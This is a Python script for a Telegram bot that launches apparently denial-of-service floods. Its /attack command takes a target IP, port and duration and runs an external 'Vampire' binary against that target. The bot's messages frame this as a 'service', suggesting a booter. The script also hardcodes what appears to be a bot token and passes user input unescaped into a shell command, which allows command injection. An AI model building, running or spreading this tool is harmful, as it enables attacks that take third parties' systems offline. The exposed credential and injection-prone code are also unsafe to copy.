import asyncio
import logging
from telegram import Update
from telegram.ext import Application, CommandHandler, CallbackContext
from telegram.error import TelegramError

# Configure logging
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    level=logging.INFO
)
logger = logging.getLogger(__name__)

TELEGRAM_BOT_TOKEN = '7738784595:AAEKNJG7gBY_LYURmmApdjRJxob9O3QPaOE'
ALLOWED_USER_ID = 5134043595  # Authorized user ID

async def start(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    logger.info(f"Received /start command from chat ID {chat_id}")
    
    message = (
        "*🔥 Welcome to the battlefield! 🔥*\n\n"
        "*Use /attack <ip> <port> <duration>*\n"
        "*Let the war begin! ⚔️💥*"
    )
    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')

    # Start a recurring job for sending messages
    context.job_queue.run_repeating(auto_start, interval=300, first=0, context=chat_id)
    logger.info("Auto start job scheduled every 5 minutes.")

async def run_attack(chat_id, ip, port, duration, context):
    logger.info(f"Initiating attack: Target {ip}:{port} for {duration} seconds.")
    try:
        process = await asyncio.create_subprocess_shell(
            f"./Vampire {ip} {port} {duration} 1024 400",
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        stdout, stderr = await process.communicate()

        if stdout:
            logger.info(f"Attack stdout: {stdout.decode()}")
        if stderr:
            logger.error(f"Attack stderr: {stderr.decode()}")

    except Exception as e:
        error_message = f"Error during the attack: {str(e)}"
        logger.error(error_message)
        await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ {error_message}*", parse_mode='Markdown')

    finally:
        await context.bot.send_message(chat_id=chat_id, text="*✅ Attack Completed! ✅*\n*Thank you for using our service!*", parse_mode='Markdown')
        logger.info("Attack completed.")

async def attack(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id
    logger.info(f"Received /attack command from user ID {user_id} in chat ID {chat_id}")

    # Check if the user is authorized
    if user_id != ALLOWED_USER_ID:
        logger.warning(f"Unauthorized user {user_id} attempted to use /attack.")
        await context.bot.send_message(chat_id=chat_id, text="*❌ You are not authorized to use this bot!*", parse_mode='Markdown')
        return

    args = context.args
    if len(args) != 3:
        logger.warning(f"Invalid arguments from user {user_id}: {args}")
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /attack <ip> <port> <duration>*", parse_mode='Markdown')
        return

    ip, port, duration = args
    logger.info(f"Launching attack with args: IP={ip}, Port={port}, Duration={duration}")
    await context.bot.send_message(chat_id=chat_id, text=( 
        f"*⚔️ Attack Launched! ⚔️*\n"
        f"*🎯 Target: {ip}:{port}*\n"
        f"*🕒 Duration: {duration} seconds*\n"
        f"*🔥 Let the battlefield ignite! 💥*"
    ), parse_mode='Markdown')

    asyncio.create_task(run_attack(chat_id, ip, port, duration, context))

async def auto_start(context: CallbackContext):
    chat_id = context.job.context
    logger.info(f"Auto-sending /start message to chat ID {chat_id}")
    
    message = (
        "*🔥 Welcome to the battlefield! 🔥*\n\n"
        "*Use /attack <ip> <port> <duration>*\n"
        "*Let the war begin! ⚔️💥*"
    )
    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')

def main():
    logger.info("Starting bot...")
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("attack", attack))

    # Run the bot
    application.run_polling()
    logger.info("Bot is running.")

if __name__ == '__main__':
    main()
